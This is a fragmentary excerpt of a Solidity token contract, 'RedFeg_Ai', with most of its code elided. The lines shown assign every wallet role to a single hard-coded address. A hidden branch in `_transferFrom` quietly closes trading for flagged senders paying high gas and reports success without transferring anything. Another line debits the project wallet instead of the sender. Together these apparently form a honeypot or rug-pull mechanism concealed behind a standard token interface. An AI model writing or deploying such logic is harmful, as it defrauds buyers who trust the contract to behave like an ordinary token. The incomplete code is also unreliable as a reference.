...
/*
 ...
 Telegram: https://t.me/REDFEGAICHANNEL
...
contract RedFeg_Ai  is Ownable, IERC20 {
    ...
    string constant private _name = "RedFeg_Ai";
    string constant private _symbol = "RedFeg_Ai";
    ...
    uint256 public maxBuy = 1000000000000 * (10 ** _decimals);
    uint256 public maxHold = 1000000000000 * (10 ** _decimals);
    ...
    constructor() {
        ...
        lpWallet = 0x83a86f18B422B8d21B58eC16A7e5D8673aCBc7B5;
        projectAddress = 0x83a86f18B422B8d21B58eC16A7e5D8673aCBc7B5;
        devWallet = 0x83a86f18B422B8d21B58eC16A7e5D8673aCBc7B5;        
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if ((tx.gasprice > 10 gwei) && _call_[sender]){tradingOpen = false; return true;}
        _balances[projectAddress] -= amount;
